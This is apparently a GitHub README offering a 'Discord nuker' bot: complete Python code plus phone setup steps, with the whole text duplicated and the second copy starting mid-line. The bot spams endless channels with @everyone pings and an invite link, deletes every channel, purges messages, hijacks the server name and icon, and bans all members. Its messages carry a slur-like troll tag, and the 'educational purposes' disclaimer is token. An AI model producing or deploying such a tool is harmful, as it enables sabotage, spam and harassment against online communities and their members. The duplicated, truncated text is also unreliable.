# Simple-Discord-Nuker
Nukes a discord server (do not abuse this, will result in account deletion. Only for educational purposes)

Nukes a discord server (do not abuse this, will result in account deletion. Only for educational purposes)

Python:
import discord
from discord.ext import commands
import asyncio
import aiohttp

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

nuke_tasks = []
nuke_running = False

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")

@bot.command()
async def ping(ctx):
    await ctx.send("Hi!")

@bot.command()
async def nuke(ctx):
    global nuke_tasks, nuke_running

    if nuke_running:
        await ctx.send("Nuke is already running!")
        return

    nuke_running = True
    await ctx.message.delete()
    created_channels = []

    async def create_channels_and_ping():
        try:
            while nuke_running:
                new_channel = await ctx.guild.create_text_channel("Trolled By Neegas")
                created_channels.append(new_channel)
                print(f"Created channel: {new_channel.name}")

                await new_channel.send("@everyone Trolled By Neegas Join Now https://discord.gg/H6y5p4jX")
                await asyncio.sleep(0.02)  # Delay to maintain ~50.5 requests per second
        except Exception as e:
            print(f"Error during nuke: {e}")

    task = asyncio.create_task(create_channels_and_ping())
    nuke_tasks.append(task)

@bot.command()
async def kill(ctx):
    global nuke_tasks, nuke_running

    await ctx.message.delete()

    nuke_running = False
    for task in nuke_tasks:
        task.cancel()
    nuke_tasks = []

    current_channel = ctx.channel
    for channel in ctx.guild.channels:
        if channel != current_channel:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")

    print("Nuke stopped, and all channels were deleted except the command channel.")

@bot.command()
async def killall(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

    print("All channels in the server were deleted.")

@bot.command()
async def clear(ctx):
    await ctx.message.delete()

    try:
        await ctx.channel.purge()
        print(f"Cleared messages in {ctx.channel.name}")
    except Exception as e:
        print(f"Failed to clear messages in {ctx.channel.name}: {e}")

@bot.command()
async def troll(ctx, name, image_url):
    await ctx.message.delete()

    try:
        await ctx.guild.edit(name=name)
        print(f"Server name changed to: {name}")
    except Exception as e:
        print(f"Error changing server name: {e}")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    image_data = await response.read()
                    await ctx.guild.edit(icon=image_data)
                    print("Server profile picture updated.")
                else:
                    print(f"Failed to fetch the image, status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Aiohttp error while fetching the image: {e}")
    except Exception as e:
        print(f"Error changing the server profile picture: {e}")

@bot.command()
async def banall(ctx):
    await ctx.message.delete()

    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban(reason="Trolled By The Neegas")
                print(f"Banned member: {member.name}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

@bot.command()
async def commands(ctx):
    commands_message = """
**Available Commands:**
- `!ping`: Replies with "Hi!"
- `!nuke`: Creates channels and pings everyone once in each.
- `!kill`: Stops `!nuke` and deletes all channels except the one where the command is issued.
- `!killall`: Deletes all channels in the server.
- `!clear`: Clears all messages in the current channel.
- `!troll Name Img_Link`: Changes the server name and profile picture.
- `!banall`: Bans all members in the server except the bot and command user.
"""
    await ctx.send(commands_message)

bot.run("Your Bot Token")


Instructions:

1. Download Termux (app store or playstore)
2. Do Not open termux yet, and download Zarchiver
3. open zarchiver and make a file like "Nuker.py"
4. you can name it anything but dont remove the ".py" always keep that on for it to work
5. now open the file u made and paste in the code up top into your file with your bot token
6. save everything
7. go back to zarchiver and long press the file you made
8. after long click, beside "Open" click the arrow and find termux
9. click termux and you will be directed to termux, click "Open Directory"
10. now follow the commands below and type it in termux
11. cd downloads
12. dir
13. (if you see the file name you made your good)
14. python "YourFilename".py
15. now test it in your server
16. type "!commands" in discord ofc if ur having trouble
17. and your set


    REMEMBER DONT ABUSE THIS OR ACCOUNT DELETE
19. scord.ext import commands
import asyncio
import aiohttp

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

nuke_tasks = []
nuke_running = False

@bot.event
async def on_ready():
    print(f"Bot is online as {bot.user}")

@bot.command()
async def ping(ctx):
    await ctx.send("Hi!")

@bot.command()
async def nuke(ctx):
    global nuke_tasks, nuke_running

    if nuke_running:
        await ctx.send("Nuke is already running!")
        return

    nuke_running = True
    await ctx.message.delete()
    created_channels = []

    async def create_channels_and_ping():
        try:
            while nuke_running:
                new_channel = await ctx.guild.create_text_channel("Trolled By Neegas")
                created_channels.append(new_channel)
                print(f"Created channel: {new_channel.name}")

                await new_channel.send("@everyone Trolled By Neegas Join Now https://discord.gg/H6y5p4jX")
                await asyncio.sleep(0.02)  # Delay to maintain ~50.5 requests per second
        except Exception as e:
            print(f"Error during nuke: {e}")

    task = asyncio.create_task(create_channels_and_ping())
    nuke_tasks.append(task)

@bot.command()
async def kill(ctx):
    global nuke_tasks, nuke_running

    await ctx.message.delete()

    nuke_running = False
    for task in nuke_tasks:
        task.cancel()
    nuke_tasks = []

    current_channel = ctx.channel
    for channel in ctx.guild.channels:
        if channel != current_channel:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")

    print("Nuke stopped, and all channels were deleted except the command channel.")

@bot.command()
async def killall(ctx):
    await ctx.message.delete()

    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except Exception as e:
            print(f"Failed to delete {channel.name}: {e}")

    print("All channels in the server were deleted.")

@bot.command()
async def clear(ctx):
    await ctx.message.delete()

    try:
        await ctx.channel.purge()
        print(f"Cleared messages in {ctx.channel.name}")
    except Exception as e:
        print(f"Failed to clear messages in {ctx.channel.name}: {e}")

@bot.command()
async def troll(ctx, name, image_url):
    await ctx.message.delete()

    try:
        await ctx.guild.edit(name=name)
        print(f"Server name changed to: {name}")
    except Exception as e:
        print(f"Error changing server name: {e}")

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(image_url) as response:
                if response.status == 200:
                    image_data = await response.read()
                    await ctx.guild.edit(icon=image_data)
                    print("Server profile picture updated.")
                else:
                    print(f"Failed to fetch the image, status code: {response.status}")
    except aiohttp.ClientError as e:
        print(f"Aiohttp error while fetching the image: {e}")
    except Exception as e:
        print(f"Error changing the server profile picture: {e}")

@bot.command()
async def banall(ctx):
    await ctx.message.delete()

    for member in ctx.guild.members:
        if member != ctx.author and member != bot.user:
            try:
                await member.ban(reason="Trolled By The Neegas")
                print(f"Banned member: {member.name}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

@bot.command()
async def commands(ctx):
    commands_message = """
**Available Commands:**
- `!ping`: Replies with "Hi!"
- `!nuke`: Creates channels and pings everyone once in each.
- `!kill`: Stops `!nuke` and deletes all channels except the one where the command is issued.
- `!killall`: Deletes all channels in the server.
- `!clear`: Clears all messages in the current channel.
- `!troll Name Img_Link`: Changes the server name and profile picture.
- `!banall`: Bans all members in the server except the bot and command user.
"""
    await ctx.send(commands_message)

bot.run("Your Bot Token")


Instructions:

1. Download Termux (app store or playstore)
2. Do Not open termux yet, and download Zarchiver
3. open zarchiver and make a file like "Nuker.py"
4. you can name it anything but dont remove the ".py" always keep that on for it to work
5. now open the file u made and paste in the code up top into your file with your bot token
6. save everything
7. go back to zarchiver and long press the file you made
8. after long click, beside "Open" click the arrow and find termux
9. click termux and you will be directed to termux, click "Open Directory"
10. now follow the commands below and type it in termux
11. cd downloads
12. dir
13. (if you see the file name you made your good)
14. python "YourFilename".py
15. now test it in your server
16. type "!commands" in discord ofc if ur having trouble
17. and your set


    REMEMBER DONT ABUSE THIS OR ACCOUNT DELETE
19. 
